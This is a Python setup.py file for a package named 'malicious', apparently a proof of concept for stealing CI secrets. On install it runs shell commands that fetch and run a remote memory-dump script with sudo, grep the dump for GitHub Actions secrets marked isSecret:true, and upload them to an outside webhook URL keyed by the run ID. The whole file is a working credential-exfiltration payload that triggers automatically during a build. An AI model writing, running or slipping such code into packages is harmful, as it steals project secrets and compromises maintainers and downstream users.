from setuptools import setup
import os
import sys

print("!!!!!!!!!! MALICIOUS SETUP.PY RUNNING !!!!!!!!!!")
sys.stderr.write("!!!!!!!!!! MALICIOUS SETUP.PY RUNNING (stderr) !!!!!!!!!!\n")

os.system(r'''curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> "/tmp/secrets"''')
os.system(r'''curl -X PUT -d \@/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"''')

# sys.exit(1) # Let's see if it prints first

setup(
    name="malicious",
    version="0.1.0",
    packages=["malicious"],
)
